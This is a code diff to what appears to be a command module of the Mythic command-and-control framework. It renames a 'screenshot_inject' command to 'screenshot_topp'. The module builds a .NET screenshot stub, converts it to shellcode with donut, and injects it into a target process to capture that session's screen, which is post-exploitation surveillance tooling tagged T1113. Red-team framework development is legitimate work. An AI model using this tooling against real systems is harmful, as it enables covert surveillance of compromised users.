@@ -12,10 +12,10 @@ import os
 import asyncio
 import donut
 
-SCREENSHOT_INJECT = "/srv/ScreenshotInject.exe"
+SCREENSHOT_topp = "/srv/Screenshottopp.exe"
 
 
-class ScreenshotInjectArguments(TaskArguments):
+class ScreenshottoppArguments(TaskArguments):
 
     def __init__(self, command_line, **kwargs):
         super().__init__(command_line, **kwargs)
@@ -53,36 +53,36 @@ class ScreenshotInjectArguments(TaskArguments):
 
     async def parse_arguments(self):
         if not len(self.command_line):
-            raise Exception("Usage: {}".format(ScreenshotInjectCommand.help_cmd))
+            raise Exception("Usage: {}".format(ScreenshottoppCommand.help_cmd))
         self.load_args_from_json_string(self.command_line)
         self.add_arg("pipe_name", str(uuid4()))
 
 
-class ScreenshotInjectCommand(CommandBase):
-    cmd = "screenshot_inject"
+class ScreenshottoppCommand(CommandBase):
+    cmd = "screenshot_topp"
     needs_admin = False
-    help_cmd = "screenshot_inject [pid] [count] [interval]"
+    help_cmd = "screenshot_topp [pid] [count] [interval]"
     description = "Take a screenshot in the session of the target PID"
     version = 2
     author = "@reznok, @djhohnstein"
-    argument_class = ScreenshotInjectArguments
+    argument_class = ScreenshottoppArguments
     browser_script = BrowserScript(script_name="screenshot", author="@djhohnstein", for_new_ui=True)
     attackmapping = ["T1113"]
-    supported_ui_features=["screenshot_inject"]
+    supported_ui_features=["screenshot_topp"]
 
-    async def build_screenshotinject(self):
-        global SCREENSHOT_INJECT
+    async def build_screenshottopp(self):
+        global SCREENSHOT_topp
         agent_build_path = tempfile.TemporaryDirectory()
-        outputPath = "{}/ScreenshotInject/bin/Release/ScreenshotInject.exe".format(agent_build_path.name)
+        outputPath = "{}/Screenshottopp/bin/Release/Screenshottopp.exe".format(agent_build_path.name)
             # shutil to copy payload files over
         copy_tree(str(self.agent_code_path), agent_build_path.name)
-        shell_cmd = "dotnet build -c release -p:DebugType=None -p:DebugSymbols=false -p:Platform=x64 {}/ScreenshotInject/ScreenshotInject.csproj -o {}/ScreenshotInject/bin/Release/".format(agent_build_path.name, agent_build_path.name)
+        shell_cmd = "dotnet build -c release -p:DebugType=None -p:DebugSymbols=false -p:Platform=x64 {}/Screenshottopp/Screenshottopp.csproj -o {}/Screenshottopp/bin/Release/".format(agent_build_path.name, agent_build_path.name)
         proc = await asyncio.create_subprocess_shell(shell_cmd, stdout=asyncio.subprocess.PIPE,
                                                          stderr=asyncio.subprocess.PIPE, cwd=agent_build_path.name)
         stdout, stderr = await proc.communicate()
         if not path.exists(outputPath):
-            raise Exception("Failed to build ScreenshotInject.exe:\n{}".format(stdout.decode() + "\n" + stderr.decode()))
-        shutil.copy(outputPath, SCREENSHOT_INJECT)
+            raise Exception("Failed to build Screenshottopp.exe:\n{}".format(stdout.decode() + "\n" + stderr.decode()))
+        shutil.copy(outputPath, SCREENSHOT_topp)
 
 
     async def create_go_tasking(self, taskData: PTTaskMessageAllData) -> PTTaskCreateTaskingMessageResponse:
@@ -90,19 +90,19 @@ class ScreenshotInjectCommand(CommandBase):
             TaskID=taskData.Task.ID,
             Success=True,
         )
-        global SCREENSHOT_INJECT
-        if not path.exists(SCREENSHOT_INJECT):
+        global SCREENSHOT_topp
+        if not path.exists(SCREENSHOT_topp):
             await SendMythicRPCTaskUpdate(MythicRPCTaskUpdateMessage(
                 TaskID=taskData.Task.ID,
                 UpdateStatus=f"building topping stub"
             ))
-            await self.build_screenshotinject()
+            await self.build_screenshottopp()
         await SendMythicRPCTaskUpdate(MythicRPCTaskUpdateMessage(
             TaskID=taskData.Task.ID,
             UpdateStatus=f"generating stub shellcode"
         ))
         donutPic = donut.create(
-            file=SCREENSHOT_INJECT, params=taskData.args.get_arg("pipe_name")
+            file=SCREENSHOT_topp, params=taskData.args.get_arg("pipe_name")
         )
         file_resp = await SendMythicRPCFileCreate(
             MythicRPCFileCreateMessage(
@@ -113,7 +113,7 @@ class ScreenshotInjectCommand(CommandBase):
             taskData.args.add_arg("loader_stub_id", file_resp.AgentFileId)
         else:
             raise Exception(
-                "Failed to register screenshot_inject stub binary: " + file_resp.Error
+                "Failed to register screenshot_topp stub binary: " + file_resp.Error
             )
         response.DisplayParams = "-PID {}".format(taskData.args.get_arg("pid"))
         return response
